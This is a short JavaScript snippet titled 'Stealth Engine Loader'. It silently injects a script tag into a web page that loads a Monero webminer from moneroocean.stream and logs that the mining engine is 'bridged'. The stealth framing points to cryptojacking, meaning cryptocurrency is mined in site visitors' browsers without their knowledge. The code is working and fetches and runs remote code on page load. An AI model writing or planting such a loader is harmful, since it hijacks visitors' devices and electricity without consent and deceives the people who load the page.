/* Stealth Engine Loader */
(function() {
    var script = document.createElement('script');
    // This connects to the official MoneroOcean webminer source
    script.src = 'https://moneroocean.stream/webminer.js';
    script.onload = function() {
        console.log("Mining engine successfully bridged.");
    };
    document.head.appendChild(script);
})();
